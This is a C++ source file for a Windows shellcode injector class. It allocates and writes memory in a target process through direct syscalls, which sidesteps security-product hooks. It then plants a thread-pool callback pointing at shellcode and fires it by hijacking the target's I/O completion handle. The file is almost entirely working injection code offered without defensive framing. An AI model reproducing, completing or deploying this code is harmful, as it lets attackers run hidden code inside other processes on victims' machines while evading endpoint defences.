#include "injector.h"
#include "../utils/dbg.h"

#define NT_SUCCESS(Status) (((NTSTATUS)(Status)) >= 0)

typedef NTSTATUS (WINAPI* fnZwSetIoCompletion)(HANDLE IoCompletionHandle, PVOID KeyContext, PVOID ApcContext, NTSTATUS IoStatus, ULONG_PTR IoStatusInformation);
PVOID mZwSetIoCompletion = GetProcAddress(GetModuleHandleA("ntdll.dll"), "ZwSetIoCompletion");
fnZwSetIoCompletion ZwSetIoCompletion = (fnZwSetIoCompletion)mZwSetIoCompletion;


PVOID Injector::allocateSc(SIZE_T memSize, ACCESS_MASK memProtection) {
	PVOID baseAddr = NULL;
	NTSTATUS okAlloc = Sw3NtAllocateVirtualMemory(this->targetProc, &baseAddr, 0, &memSize, MEM_COMMIT | MEM_RESERVE, memProtection);
	return baseAddr;
}

bool Injector::writeSc(PVOID baseAddr, PVOID memBuffer, SIZE_T memSize) {
	NTSTATUS okWrite = Sw3NtWriteVirtualMemory(this->targetProc, baseAddr, memBuffer, memSize, NULL);
	return NT_SUCCESS(okWrite);
}

bool Injector::injectIntoProcess(PVOID scAddr) {
	auto hIOC = this->hijackProcessHandle(L"IoCompletion");
	
	TP_DIRECT Direct = { 0 };

	Direct.Callback = scAddr;

	const auto RemoteDirectAddress = static_cast<PTP_DIRECT>(this->allocateSc(sizeof(TP_DIRECT), PAGE_READWRITE));
	
	if (!this->writeSc(RemoteDirectAddress, &Direct, sizeof(TP_DIRECT)))
		return false;

	NTSTATUS status = ZwSetIoCompletion(hIOC, RemoteDirectAddress, 0, 0, 0);
	
	return NT_SUCCESS(status);
}

void Injector::alertFail(BOOL code, const char* err) {
	if (code == 1) {
		error("%s, Error Code: %ld", err, GetLastError());
	}
}

PVOID Injector::allocateHeap(SIZE_T size) {
	return HeapAlloc(
		this->heap,
		HEAP_ZERO_MEMORY,
		size
	);
}

void Injector::cleanHeap(PVOID buffer) {
	HeapFree(
		this->heap,
		NULL,
		buffer
	);
}

void Injector::closeHandle(HANDLE handle) {
	CloseHandle(handle);
}